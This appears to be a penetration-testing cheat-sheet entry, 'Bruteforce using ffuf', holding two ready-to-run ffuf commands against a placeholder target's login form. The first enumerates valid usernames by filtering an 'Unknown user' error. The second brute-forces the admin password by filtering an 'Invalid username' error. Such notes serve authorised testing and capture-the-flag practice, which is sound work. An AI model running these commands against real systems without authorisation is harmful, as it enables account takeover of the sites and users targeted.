## Bruteforce using ffuf

```bash
# User
$ ffuf -w `fzf-wordlists` -u http://$TARGET/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=FUZZ&password=invalid" -fr "Unknown user"
# Password
$ ffuf -w `fzf-wordlists` -u http://$TARGET/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=admin&password=FUZZ" -fr "Invalid username"
```
